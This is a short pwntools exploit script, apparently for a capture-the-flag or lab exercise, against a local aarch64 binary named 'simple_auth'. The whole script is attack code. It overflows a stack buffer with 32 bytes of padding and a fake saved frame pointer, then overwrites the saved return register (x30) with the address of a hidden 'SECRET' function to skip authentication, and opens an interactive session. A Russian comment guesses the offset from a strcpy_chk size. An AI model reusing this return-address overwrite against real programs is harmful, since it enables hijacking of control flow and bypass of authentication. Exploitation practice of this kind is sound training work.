from pwn import *

context.arch = 'aarch64'
context.log_level = 'debug'

binary = "./simple_auth"

OFFSET = 32   # почти наверняка, если strcpy_chk с size=0x20
SECRET = 0x10000063c

payload  = b"A" * OFFSET
payload += p64(0x4141414141414141)  # fake x29
payload += p64(SECRET)              # overwrite x30

io = process([binary, payload])
io.interactive()

